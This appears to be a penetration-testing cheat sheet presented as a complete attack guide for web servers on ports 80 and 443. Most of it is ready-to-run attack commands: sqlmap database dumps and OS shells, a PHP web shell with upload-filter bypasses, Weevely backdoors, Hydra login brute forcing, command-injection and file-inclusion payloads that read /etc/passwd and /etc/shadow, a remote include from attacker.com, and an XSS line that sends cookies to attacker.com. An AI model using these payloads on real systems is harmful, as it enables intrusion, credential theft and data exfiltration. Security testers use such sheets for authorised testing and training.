# Port 80/443 - HTTP/HTTPS - Complete Attack Guide

## 📖 Overview

**Protocol**: HTTP (HyperText Transfer Protocol) / HTTPS (HTTP Secure)
**Ports**: 80 (HTTP), 443 (HTTPS), 8080, 8443 (alternate)
**Transport**: TCP
**Encryption**: None (HTTP), TLS/SSL (HTTPS)
**Authentication**: Various (Basic, Digest, Bearer, OAuth, etc.)

## 🎯 Attack Objectives

- **SQL Injection**: Extract database contents
- **Directory Enumeration**: Find hidden files/directories
- **Authentication Bypass**: Access restricted areas
- **XSS**: Execute JavaScript in victim browsers
- **File Upload**: Upload malicious files (webshells)
- **Command Injection**: Execute OS commands
- **Information Disclosure**: Extract sensitive data

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect HTTP/HTTPS Service**
```bash
# Quick scan
nmap -p 80,443,8080,8443 192.168.1.100

# Service version
nmap -p 80,443 -sV 192.168.1.100

# HTTP enum scripts
nmap -p 80,443 --script http-* 192.168.1.100

# Find all web ports
nmap -p- --open 192.168.1.100 | grep http
```

**1.2 Banner Grabbing**
```bash
# Using curl
curl -I http://192.168.1.100

# Using wget
wget --server-response --spider http://192.168.1.100

# Using netcat
echo -e "HEAD / HTTP/1.1\r\nHost: 192.168.1.100\r\n\r\n" | nc 192.168.1.100 80

# Using Nmap
nmap -p 80 --script http-headers 192.168.1.100
```

**1.3 Technology Detection**
```bash
# WhatWeb
whatweb http://192.168.1.100

# Wappalyzer (CLI)
wappalyzer http://192.168.1.100

# Nmap
nmap -p 80,443 --script http-enum,http-headers,http-methods,http-webdav-scan 192.168.1.100

# Manual header analysis
curl -I http://192.168.1.100 | grep -i "server\|x-powered"
```

### Phase 2: Directory and File Enumeration

**2.1 Directory Brute Force**

**Using Gobuster**:
```bash
# Basic directory enum
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://192.168.1.100 -w wordlist.txt -x php,html,txt,jsp

# Ignore specific status codes
gobuster dir -u http://192.168.1.100 -w wordlist.txt -b 404,403

# Custom user agent
gobuster dir -u http://192.168.1.100 -w wordlist.txt -a "Mozilla/5.0"

# HTTPS with certificate ignore
gobuster dir -u https://192.168.1.100 -w wordlist.txt -k
```

**Using Dirb**:
```bash
# Basic scan
dirb http://192.168.1.100

# Custom wordlist
dirb http://192.168.1.100 /usr/share/wordlists/dirb/big.txt

# With extensions
dirb http://192.168.1.100 -X .php,.html,.txt

# Silent mode
dirb http://192.168.1.100 -S
```

**Using ffuf**:
```bash
# Directory fuzzing
ffuf -w wordlist.txt -u http://192.168.1.100/FUZZ

# Extension fuzzing
ffuf -w extensions.txt -u http://192.168.1.100/admin.FUZZ

# Filter by response size
ffuf -w wordlist.txt -u http://192.168.1.100/FUZZ -fs 1234

# Match status codes
ffuf -w wordlist.txt -u http://192.168.1.100/FUZZ -mc 200,301,302
```

**Using Feroxbuster**:
```bash
# Recursive scanning
feroxbuster -u http://192.168.1.100 -w wordlist.txt

# Depth limit
feroxbuster -u http://192.168.1.100 -w wordlist.txt -d 3

# Extensions
feroxbuster -u http://192.168.1.100 -w wordlist.txt -x php,html,txt
```

**2.2 Subdomain Enumeration**
```bash
# Gobuster
gobuster vhost -u http://target.com -w subdomains.txt

# ffuf
ffuf -w subdomains.txt -u http://FUZZ.target.com

# wfuzz
wfuzz -c -w subdomains.txt -u http://FUZZ.target.com --hw 0
```

### Phase 3: Vulnerability Scanning

**3.1 Nikto Scan**
```bash
# Basic scan
nikto -h http://192.168.1.100

# SSL scan
nikto -h https://192.168.1.100 -ssl

# Tuning options
nikto -h http://192.168.1.100 -Tuning 123456789

# Save output
nikto -h http://192.168.1.100 -o nikto_results.html -Format html
```

**3.2 Vulnerability Scanners**
```bash
# Nmap vulnerability scripts
nmap -p 80,443 --script http-vuln-* 192.168.1.100

# WPScan (WordPress)
wpscan --url http://192.168.1.100 --enumerate u,p,t

# Joomscan (Joomla)
joomscan -u http://192.168.1.100

# Droopescan (Drupal)
droopescan scan drupal -u http://192.168.1.100
```

### Phase 4: SQL Injection

**4.1 Manual SQL Injection**
```bash
# Test for SQL injection
curl "http://192.168.1.100/page.php?id=1'"
curl "http://192.168.1.100/page.php?id=1' OR '1'='1"
curl "http://192.168.1.100/page.php?id=1' AND '1'='2"

# Common payloads
' OR 1=1--
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL--
1' ORDER BY 1--
1' ORDER BY 10--
```

**4.2 SQLMap**
```bash
# Basic scan
sqlmap -u "http://192.168.1.100/page.php?id=1"

# Dump databases
sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs

# Dump tables
sqlmap -u "http://192.168.1.100/page.php?id=1" -D database_name --tables

# Dump data
sqlmap -u "http://192.168.1.100/page.php?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://192.168.1.100/page.php?id=1" --os-shell

# POST request
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=admin"

# With cookies
sqlmap -u "http://192.168.1.100/page.php?id=1" --cookie="PHPSESSID=abc123"
```

### Phase 5: File Upload Attacks

**5.1 Web Shell Upload**
```bash
# PHP web shell
<?php system($_GET['cmd']); ?>

# Save as shell.php, upload via form

# Access
curl http://192.168.1.100/uploads/shell.php?cmd=whoami

# Alternative extensions (bypass filters)
shell.php5
shell.phtml
shell.phar
shell.php.jpg
shell.jpg.php

# Null byte injection (old PHP)
shell.php%00.jpg
```

**5.2 Using Weevely**
```bash
# Generate backdoor
weevely generate password shell.php

# Upload shell.php to target

# Connect
weevely http://192.168.1.100/shell.php password

# Interactive shell
```

### Phase 6: Authentication Attacks

**6.1 Brute Force Login**

**Using Hydra**:
```bash
# HTTP GET
hydra -l admin -P passwords.txt 192.168.1.100 http-get /admin

# HTTP POST
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# HTTPS
hydra -l admin -P passwords.txt 192.168.1.100 https-post-form "/login:username=^USER^&password=^PASS^:F=failed"

# Basic Auth
hydra -l admin -P passwords.txt 192.168.1.100 http-get /protected
```

**Using Burp Suite Intruder**:
```
1. Intercept login request
2. Send to Intruder
3. Mark username/password fields
4. Load wordlist
5. Start attack
```

**Using WFuzz**:
```bash
# POST form brute force
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" http://192.168.1.100/login.php

# Hide specific response
wfuzz -c -z file,passwords.txt --hc 200 -d "username=admin&password=FUZZ" http://192.168.1.100/login.php
```

**6.2 Default Credentials**
```bash
# Common defaults
admin:admin
admin:password
root:root
administrator:administrator
admin:[blank]

# Check https://github.com/ihebski/DefaultCreds-cheat-sheet
```

### Phase 7: Advanced Attacks

**7.1 Command Injection**
```bash
# Test payloads
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# Example
curl "http://192.168.1.100/ping.php?ip=127.0.0.1;whoami"
curl "http://192.168.1.100/ping.php?ip=127.0.0.1|cat%20/etc/passwd"

# Blind command injection (no output)
curl "http://192.168.1.100/ping.php?ip=127.0.0.1;sleep 10"
# If delay = vulnerable
```

**7.2 Local File Inclusion (LFI)**
```bash
# Read /etc/passwd
curl "http://192.168.1.100/page.php?file=../../../../etc/passwd"

# Common files to read
/etc/passwd
/etc/shadow
/var/www/html/config.php
C:\Windows\System32\drivers\etc\hosts
C:\xampp\htdocs\config.php

# PHP wrappers
curl "http://192.168.1.100/page.php?file=php://filter/convert.base64-encode/resource=config.php"

# Log poisoning
# Inject PHP code in User-Agent
# Then include log file
curl "http://192.168.1.100/page.php?file=/var/log/apache2/access.log"
```

**7.3 Remote File Inclusion (RFI)**
```bash
# Host malicious file
echo "<?php system('whoami'); ?>" > shell.txt
python3 -m http.server 80

# Include remote file
curl "http://192.168.1.100/page.php?file=http://attacker.com/shell.txt"
```

**7.4 Cross-Site Scripting (XSS)**
```bash
# Reflected XSS
http://192.168.1.100/search.php?q=<script>alert('XSS')</script>

# Test payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Steal cookies
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Using XSStrike
xsstrike -u "http://192.168.1.100/search.php?q=test"
```

## 🛡️ Bypass Techniques

See [Full Bypass Techniques Guide](bypass_techniques.md) for detailed WAF/filter bypass methods.

### Quick Bypass Examples
```bash
# WAF bypass - SQL injection
id=1/**/UNION/**/SELECT/**/NULL
id=1/*!UNION*//*!SELECT*/NULL

# Path traversal bypass
../
..%2f
..%252f
....//

# Extension bypass
shell.php%00.jpg
shell.php.jpg
shell.phar
```

## 📊 Information Extraction

```bash
# Find comments in source
curl http://192.168.1.100 | grep -i "<!--"

# Extract emails
curl http://192.168.1.100 | grep -oE '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'

# Find potential files
# robots.txt, sitemap.xml, .git, .env, backup.sql
curl http://192.168.1.100/robots.txt
curl http://192.168.1.100/.git/config
curl http://192.168.1.100/.env
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Input Validation** - Sanitize all user input
2. **Prepared Statements** - Prevent SQL injection
3. **WAF** - Deploy Web Application Firewall
4. **HTTPS Only** - Enforce SSL/TLS
5. **Security Headers** - CSP, X-Frame-Options, etc.
6. **Rate Limiting** - Prevent brute force
7. **File Upload Controls** - Validate file types
8. **Disable Directory Listing** - Hide directory contents
9. **Update Software** - Patch CMS and plugins
10. **Least Privilege** - Minimize permissions

## 🎯 Practical Attack Scenario

```bash
# Discovery
nmap -p 80,443 -sV 192.168.1.100
whatweb http://192.168.1.100
# Found: Apache 2.4.41, PHP 7.4

# Directory enum
gobuster dir -u http://192.168.1.100 -w common.txt
# Found: /admin, /uploads, /backup

# Vulnerability scan
nikto -h http://192.168.1.100
# Found: Potential SQL injection

# SQL Injection
sqlmap -u "http://192.168.1.100/product.php?id=1" --dbs
# Dumped database!

# Found admin credentials
# admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
# Cracked: admin:password

# Access admin panel
# Upload PHP webshell
# System compromised!
```

## 📚 Tools Summary

- **Directory Enum**: Gobuster, Dirb, ffuf, Feroxbuster
- **Vulnerability Scan**: Nikto, Nmap, Burp Suite
- **SQL Injection**: SQLMap
- **Brute Force**: Hydra, Burp Suite, WFuzz
- **XSS**: XSStrike, Burp Suite
- **General**: curl, Burp Suite, ZAP

---

**Last Updated**: 2026-06-16
